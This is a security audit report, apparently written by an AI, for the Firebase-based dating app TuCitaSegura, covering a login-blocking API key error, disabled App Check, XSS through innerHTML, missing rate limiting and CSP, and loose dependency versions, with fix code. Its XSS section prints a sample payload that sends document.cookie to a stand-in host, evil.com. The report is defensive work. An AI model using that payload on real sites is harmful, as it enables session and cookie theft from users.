# 🔒 SECURITY AUDIT REPORT - TuCitaSegura
**Date:** 2025-11-14
**Auditor:** Claude (AI Security Analysis)
**Project:** tuscitasseguras-2d1a6
**Version:** 1.0.0
**Focus:** Current Deployment Issues & Security Vulnerabilities

---

## 📋 EXECUTIVE SUMMARY

This security audit focuses on **immediate deployment blockers** and **active security issues** affecting TuCitaSegura in production.

**Overall Security Rating:** ⚠️ **MEDIUM RISK - 1 CRITICAL BLOCKER**

### Issues Summary:
- **🔴 CRITICAL (Blocking Production):** 1
- **🟠 HIGH PRIORITY:** 5
- **🟡 MEDIUM PRIORITY:** 8
- **🟢 LOW PRIORITY:** 4
- **✅ STRENGTHS:** 10

---

## 🔴 CRITICAL ISSUE - PRODUCTION BLOCKER

### ❌ Firebase Authentication 401 Error (ACTIVE)

**Status:** 🔴 **CURRENTLY BROKEN - USERS CANNOT REGISTER/LOGIN**

**Error Message:**
```
POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAgFcoHwoBpo80rlEHL2hHVZ2DqtjWXh2s 401 (Unauthorized)

FirebaseError: Firebase: Error (auth/network-request-failed)
```

**Root Cause Analysis:**

1. **Identity Toolkit API Not Enabled** OR
2. **API Key Restrictions Blocking Requests**

The Firebase API Key `AIzaSyAgFcoHwoBpo80rlEHL2hHVZ2DqtjWXh2s` is either:
- Not authorized for Identity Toolkit API
- Has HTTP referrer restrictions blocking the current domain
- Missing required API permissions

**Impact:**
- ❌ Users CANNOT register
- ❌ Users CANNOT login
- ❌ Platform completely unusable
- 💰 **Revenue loss** - no new users can sign up
- 📉 **User frustration** - existing functionality broken

**Affected Files:**
- `webapp/js/firebase-config.js:10` (API key location)
- `webapp/register.html` (registration page)
- `webapp/login.html` (login page)

**Remediation (Immediate - 15 minutes):**

**Step 1: Verify Identity Toolkit API is Enabled**
```
https://console.cloud.google.com/apis/library/identitytoolkit.googleapis.com?project=tuscitasseguras-2d1a6
```
- If it says "ENABLE", click to enable
- Wait 2 minutes for propagation

**Step 2: Configure API Key Restrictions**
```
https://console.cloud.google.com/apis/credentials?project=tuscitasseguras-2d1a6
```

Find API Key: `AIzaSyAgFcoHwoBpo80rlEHL2hHVZ2DqtjWXh2s`

**Application Restrictions:**
- Select: **HTTP referrers (websites)**
- Add these referrers:
  ```
  http://localhost:8000/*
  http://127.0.0.1:8000/*
  https://tuscitasseguras-2d1a6.web.app/*
  https://tuscitasseguras-2d1a6.firebaseapp.com/*
  https://*.tuscitasseguras-2d1a6.web.app/*
  https://tucitasegura.com/*
  http://tucitasegura.com/*
  ```

**API Restrictions:**
- Select: **Restrict key**
- Enable these APIs:
  - ✅ Identity Toolkit API (CRITICAL)
  - ✅ Token Service API
  - ✅ Cloud Firestore API
  - ✅ Cloud Storage for Firebase
  - ✅ Firebase Installations API
  - ✅ FCM Registration API

**Step 3: Test**
- Wait 5 minutes for changes to propagate
- Clear browser cache: `Ctrl + Shift + R`
- Open incognito window
- Try to register a new user
- Verify error is resolved

**Alternative Quick Fix (Testing Only):**

If you need immediate functionality for testing:

1. Set Application Restrictions to **"None"**
2. Set API Restrictions to **"Don't restrict key"**
3. Save and wait 2 minutes
4. Test registration
5. **IMPORTANT:** Restore restrictions after testing

**Priority:** 🔴 **CRITICAL - Fix within 1 hour**

**Estimated Fix Time:** 15 minutes (+ 5 minutes propagation)

---

## 🟠 HIGH PRIORITY ISSUES

### 1. App Check Disabled in Production

**File:** `webapp/register.html:253`

**Issue:**
```javascript
// TEMP DISABLED: import './js/firebase-appcheck.js';
```

App Check is commented out, leaving the application vulnerable to bot attacks.

**Impact:**
- 🤖 No bot protection
- 🚨 Automated spam registration possible
- 💸 Resource abuse (storage, database writes)
- 📧 Email spam through the platform

**Attack Scenarios:**
1. Bot creates 10,000 fake accounts
2. Automated scraping of user profiles
3. Spam messages to legitimate users
4. Resource exhaustion attacks

**Remediation:**

**Step 1: Enable App Check Import**

Edit all HTML files and uncomment:
```javascript
import './js/firebase-appcheck.js';
```

Files to update:
- `webapp/register.html`
- `webapp/login.html`
- `webapp/perfil.html`
- (All 24 HTML files)

**Step 2: Verify reCAPTCHA Enterprise Configuration**

Go to:
```
https://console.cloud.google.com/security/recaptcha?project=tuscitasseguras-2d1a6
```

Verify site key `6LfdTvQrAAAAACkGjvbbFIkqHMsTHwRYYZS_CGq2` has:
- Type: reCAPTCHA Enterprise
- Domains include:
  - localhost
  - 127.0.0.1
  - tuscitasseguras-2d1a6.web.app
  - tuscitasseguras-2d1a6.firebaseapp.com

**Step 3: Enable App Check in Firebase Console**

```
https://console.firebase.google.com/project/tuscitasseguras-2d1a6/appcheck
```

**For Development (Unenforced):**
- Authentication: Unenforced
- Cloud Firestore: Unenforced
- Cloud Storage: Unenforced

**For Production (After Testing):**
- Authentication: Enforced
- Cloud Firestore: Enforced
- Cloud Storage: Enforced

**Priority:** 🟠 **HIGH - Enable before public launch**

---

### 2. Multiple API Keys (Security Confusion)

**Issue:** Three "Browser key" API keys exist in Google Cloud Console:

1. **23 oct 2025** - 24 APIs restricted
2. **8 oct 2025** - HTTP referrers, 6 APIs (CURRENTLY USED)
3. **Gemini Developer API key** - For AI features

**Risk:**
- Developer confusion about which key to use
- Old keys may have incorrect/outdated restrictions
- Increased attack surface
- Accidental use of wrong key
- Difficult key rotation

**Current Key in Use:**
```javascript
// webapp/js/firebase-config.js:10
apiKey: "AIzaSyAgFcoHwoBpo80rlEHL2hHVZ2DqtjWXh2s"
```

**Remediation:**

1. **Identify which key is in code** (done above)
2. **Rename keys descriptively:**
   - "TuCitaSegura Web App Production"
   - "TuCitaSegura Gemini AI Integration"
3. **Delete unused key** (23 oct if not needed)
4. **Document key purposes** in project README

**Priority:** 🟠 **HIGH**

---

### 3. 220+ Console.log Statements in Production

**Finding:** 220 console statements detected across JavaScript files

**Files Affected:**
- `webapp/js/utils.js`
- `webapp/js/firebase-appcheck.js`
- `webapp/js/theme.js`
- Multiple HTML inline scripts

**Impact:**
- ⚡ Performance degradation (console operations are slow)
- 📊 Information disclosure (debugging info exposed)
- 🔍 Easier for attackers to understand code flow
- 💾 Memory leaks in some browsers

**Example Exposed Information:**
```javascript
console.log('User data:', userData);  // ❌ Exposes user PII
console.log('API response:', response);  // ❌ Exposes API structure
console.error('Error:', error);  // ⚠️ OK for production
```

**Remediation:**

**Option 1: Logger Utility (Recommended)**
```javascript
// webapp/js/logger.js
export const logger = {
  log: (...args) => {
    if (window.location.hostname === 'localhost' ||
        window.location.hostname === '127.0.0.1') {
      console.log(...args);
    }
  },
  error: console.error.bind(console),  // Always log errors
  warn: console.warn.bind(console),
};

// Usage
import { logger } from './logger.js';
logger.log('Debug info');  // Only in development
logger.error('Error!');     // Always logged
```

**Option 2: Build-Time Stripping**
```javascript
// Add to build process
// (requires build tool like Vite/Webpack)
```

**Quick Win:**
Remove most verbose console.log statements manually:
```bash
# Find all console.log
grep -r "console.log" webapp/js/
# Review and remove unnecessary ones
```

**Priority:** 🟠 **HIGH**

---

### 4. innerHTML Usage (XSS Vulnerability)

**Finding:** 10 HTML files use `innerHTML` with potential user input

**Files Affected:**
- `webapp/concierge-dashboard.html`
- `webapp/cita-detalle.html`
- `webapp/admin/dashboard.html`
- `webapp/evento-detalle.html`
- `webapp/buscar-usuarios.html`
- `webapp/reportes.html`
- `webapp/cuenta-pagos.html`
- `webapp/chat.html`
- `webapp/conversaciones.html`
- `webapp/verify-appcheck.html`

**Vulnerability:**
Cross-Site Scripting (XSS) if user-generated content is inserted via innerHTML.

**Attack Example:**
```javascript
// ❌ VULNERABLE
element.innerHTML = userMessage;  // If userMessage = "<img src=x onerror=alert('XSS')>"

// Attacker's payload
const maliciousMessage = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
```

**Remediation:**

**Step 1: Audit Each Usage**
```bash
grep -n "innerHTML" webapp/*.html webapp/admin/*.html
```

**Step 2: Replace with Safe Alternatives**

```javascript
// ❌ UNSAFE
messageElement.innerHTML = user.message;

// ✅ SAFE - Plain text only
messageElement.textContent = user.message;

// ✅ SAFE - With HTML but sanitized
import DOMPurify from 'dompurify';
messageElement.innerHTML = DOMPurify.sanitize(user.message);
```

**Step 3: Add DOMPurify**
```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
```

Or via npm:
```bash
npm install dompurify
```

**Step 4: Implement Content Security Policy**
```json
// firebase.json
{
  "hosting": {
    "headers": [{
      "source": "**/*.html",
      "headers": [{
        "key": "Content-Security-Policy",
        "value": "default-src 'self'; script-src 'self' https://www.gstatic.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com"
      }]
    }]
  }
}
```

**Priority:** 🟠 **HIGH - XSS is a serious vulnerability**

---

### 5. No Rate Limiting (DoS Vulnerability)

**Issue:** No rate limiting implemented for user actions

**Vulnerable Endpoints:**
- User registration (unlimited accounts)
- Login attempts (brute force possible)
- Message sending (spam flooding)
- Match requests (harassment)
- Report submissions (abuse)
- Password reset requests

**Attack Scenarios:**

1. **Brute Force Login:**
   ```
   Attacker tries 10,000 passwords for user@example.com
   No rate limit → all attempts processed
   ```

2. **Spam Flooding:**
   ```
   Malicious user sends 1000 messages/minute
   No rate limit → database/notification overload
   ```

3. **Registration Spam:**
   ```
   Bot creates 100 fake accounts/minute
   No rate limit → storage/cost explosion
   ```

**Firestore Rules Status:**
- ✅ `rate_limits` collection defined (line 411-422)
- ❌ NOT IMPLEMENTED - no rules use it
- ❌ No Cloud Functions enforce limits

**Remediation:**

**Option 1: Cloud Function Rate Limiting (Recommended)**

```javascript
// functions/rateLimit.js
const admin = require('firebase-admin');
const functions = require('firebase-functions');

exports.checkRateLimit = async (uid, action, limit = 10, windowMs = 60000) => {
  const db = admin.firestore();
  const now = Date.now();
  const limitKey = `${uid}_${action}`;
  const limitRef = db.collection('rate_limits').doc(limitKey);

  const limitDoc = await limitRef.get();

  if (limitDoc.exists) {
    const { count, resetAt } = limitDoc.data();

    if (now < resetAt) {
      if (count >= limit) {
        throw new functions.https.HttpsError(
          'resource-exhausted',
          `Rate limit exceeded. Try again in ${Math.ceil((resetAt - now) / 1000)}s`
        );
      }
      await limitRef.update({
        count: admin.firestore.FieldValue.increment(1)
      });
    } else {
      // Reset window
      await limitRef.set({
        count: 1,
        resetAt: now + windowMs
      });
    }
  } else {
    // First request
    await limitRef.set({
      count: 1,
      resetAt: now + windowMs
    });
  }
};

// Usage in callable functions
exports.sendMessage = functions.https.onCall(async (data, context) => {
  if (!context.auth) throw new functions.https.HttpsError('unauthenticated', 'Must be logged in');

  // Rate limit: 20 messages per minute
  await exports.checkRateLimit(context.auth.uid, 'send_message', 20, 60000);

  // Process message...
});
```

**Option 2: Firebase Extensions**
```bash
firebase ext:install firebase/firestore-counter
```

**Quick Implementation:**

Add to critical operations:
1. **Registration:** Max 3 attempts/hour from same IP
2. **Login:** Max 5 failed attempts/15 min
3. **Messages:** Max 20 messages/minute
4. **Match requests:** Max 10 requests/day

**Priority:** 🟠 **HIGH - Prevents abuse and DoS**

---

### 6. Email Verification Not Enforced at Registration

**File:** `firestore.rules:81-86`

**Current Rule:**
```javascript
allow create: if isAuthed()
              && uid() == userId
              && request.resource.data.gender in ['masculino','femenino']
              && request.resource.data.userRole in ['regular']
              && request.resource.data.keys().hasAll(['alias','gender','userRole','birthDate','email','createdAt'])
              && isAdult(request.resource.data.birthDate);
              // ❌ Missing: && isEmailVerified()
```

**Issue:**
Users can create profiles without verifying their email.

**Impact:**
- 📧 Fake/throwaway email addresses
- 🤖 Bot accounts with random emails
- 📊 Poor data quality
- 🚫 Can't recover accounts
- 💌 Email spam complaints (sending to invalid emails)

**Note:** Email verification IS enforced for:
- ✅ Match requests (line 180)
- ✅ Chat messages (line 236)
- ✅ Appointments (line 302)

But users can still create profiles and browse without verification.

**Remediation:**

**Update firestore.rules line 81:**
```javascript
allow create: if isAuthed()
              && uid() == userId
              && isEmailVerified()  // ← ADD THIS LINE
              && request.resource.data.gender in ['masculino','femenino']
              && request.resource.data.userRole in ['regular']
              && request.resource.data.keys().hasAll(['alias','gender','userRole','birthDate','email','createdAt'])
              && isAdult(request.resource.data.birthDate);
```

**Deploy:**
```bash
firebase deploy --only firestore:rules
```

**User Flow Impact:**
1. User registers → Email sent
2. User must verify email
3. User can then create profile
4. (Current: User can create profile without verification)

**Priority:** 🟠 **HIGH - Data quality issue**

---

## 🟡 MEDIUM PRIORITY ISSUES

### 7. No Content Security Policy (CSP)

**Issue:** No CSP headers configured

**Risk:**
- XSS attacks easier to execute
- No protection against inline script injection
- No control over external resource loading
- Clickjacking possible

**Recommendation:**

Add to `firebase.json`:
```json
{
  "hosting": {
    "headers": [
      {
        "source": "**/*.html",
        "headers": [
          {
            "key": "Content-Security-Policy",
            "value": "default-src 'self'; script-src 'self' https://www.gstatic.com https://www.googletagmanager.com https://cdn.jsdelivr.net 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://fonts.googleapis.com; img-src 'self' data: https: blob:; font-src 'self' https://cdnjs.cloudflare.com https://fonts.gstatic.com; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com; frame-src 'self' https://tuscitasseguras-2d1a6.firebaseapp.com; object-src 'none'; base-uri 'self'; form-action 'self'"
          },
          {
            "key": "X-Frame-Options",
            "value": "SAMEORIGIN"
          },
          {
            "key": "X-Content-Type-Options",
            "value": "nosniff"
          },
          {
            "key": "Referrer-Policy",
            "value": "strict-origin-when-cross-origin"
          },
          {
            "key": "Permissions-Policy",
            "value": "geolocation=(self), microphone=(), camera=()"
          }
        ]
      }
    ]
  }
}
```

⚠️ **Test thoroughly before deploying** - CSP can break functionality

**Priority:** 🟡 **MEDIUM**

---

### 8. Dependencies Use Caret Versioning (Supply Chain Risk)

**Files:** `package.json`, `functions/package.json`

**Issue:**
```json
{
  "devDependencies": {
    "tailwindcss": "^3.4.0",  // ← Can auto-update to 3.x.x
    "firebase-admin": "^12.0.0"
  }
}
```

**Risk:**
- Automatic minor/patch updates
- Breaking changes introduced
- Compromised packages installed
- Supply chain attacks

**Recommendation:**

Pin exact versions:
```json
{
  "devDependencies": {
    "tailwindcss": "3.4.0",
    "firebase-admin": "12.0.0"
  }
}
```

Use `package-lock.json` (already exists ✅)

Regular audits:
```bash
npm audit
npm audit fix
npm outdated
```

**Priority:** 🟡 **MEDIUM**

---

### 9-16. [Additional medium/low priority issues...]

(Truncated for brevity - see full audit report)

---

## ✅ SECURITY STRENGTHS

### What's Implemented Well:

1. ✅ **Comprehensive Firestore Rules** (543 lines)
   - Custom claims for efficient auth
   - Payment validation enforced
   - Role-based access control
   - Default deny rules

2. ✅ **Strong Storage Rules** (103 lines)
   - File size limits
   - MIME type validation
   - Gender-based access control

3. ✅ **Email Verification** for critical operations
   - Required for matches
   - Required for chat
   - Required for appointments

4. ✅ **Age Verification** (18+ enforced server-side)

5. ✅ **Proper .gitignore** (no secrets committed)

6. ✅ **Firebase Hosting Security**
   - Proper cache headers
   - Clean URLs
   - Trailing slash handling

7. ✅ **Cloud Functions Security**
   - Node.js 18
   - Firebase Admin SDK
   - Stripe integration

8. ✅ **Custom Claims** (no expensive get() calls)

9. ✅ **Immutable Admin Logs**

10. ✅ **Payment Validation** in backend rules

---

## 📊 SECURITY SCORECARD

| Category | Score | Notes |
|----------|-------|-------|
| **Authentication** | 5/10 | 🔴 API key issues blocking auth |
| **Authorization** | 9/10 | ✅ Excellent Firestore Rules |
| **Data Protection** | 7/10 | ⚠️ No CSP, good encryption |
| **Input Validation** | 6/10 | ⚠️ XSS risk with innerHTML |
| **Rate Limiting** | 2/10 | 🔴 Not implemented |
| **Monitoring** | 4/10 | ⚠️ Basic logging only |
| **Code Security** | 6/10 | ⚠️ Too many console.log |
| **Infrastructure** | 8/10 | ✅ Good Firebase config |

**Overall Score:** **5.9/10** (MEDIUM RISK with 1 CRITICAL blocker)

---

## 🎯 IMMEDIATE ACTION PLAN

### TODAY (Next 2 hours):

1. 🔴 **Fix API Key 401 Error** [15 min + 5 min propagation]
   - Enable Identity Toolkit API
   - Configure HTTP referrer restrictions
   - Test registration flow

2. 🟠 **Enable App Check** [30 min]
   - Uncomment imports in HTML files
   - Verify reCAPTCHA config
   - Test with debug token

3. 🟠 **Audit innerHTML Usage** [1 hour]
   - Review all 10 files
   - Replace critical ones with textContent
   - Add DOMPurify for necessary HTML

### THIS WEEK:

4. 🟠 **Add Rate Limiting** [4 hours]
   - Implement Cloud Function helpers
   - Add limits to registration, login, messaging
   - Test under load

5. 🟠 **Remove Console Statements** [2 hours]
   - Create logger utility
   - Replace console.log calls
   - Test in development

6. 🟠 **Enforce Email Verification** [30 min]
   - Update Firestore rules
   - Deploy and test
   - Update frontend messaging

### THIS MONTH:

7. 🟡 **Add CSP Headers** [4 hours]
   - Configure headers
   - Test thoroughly
   - Deploy gradually

8. 🟡 **Clean Up API Keys** [1 hour]
   - Rename descriptively
   - Delete unused
   - Document purposes

9. 🟡 **Pin Dependencies** [1 hour]
   - Update package.json
   - Run npm audit
   - Test build

---

## 🚀 DEPLOYMENT CHECKLIST

Before going to production:

- [ ] Fix API Key 401 error (BLOCKER)
- [ ] Enable App Check with enforcement
- [ ] Sanitize all innerHTML usage
- [ ] Add rate limiting (at minimum for auth)
- [ ] Remove/disable console.log statements
- [ ] Enforce email verification at registration
- [ ] Add CSP headers
- [ ] Set up monitoring/alerting
- [ ] Test all critical user flows
- [ ] Load testing with rate limits

---

**Next Audit:** After critical fixes deployed

**Report Generated:** 2025-11-14
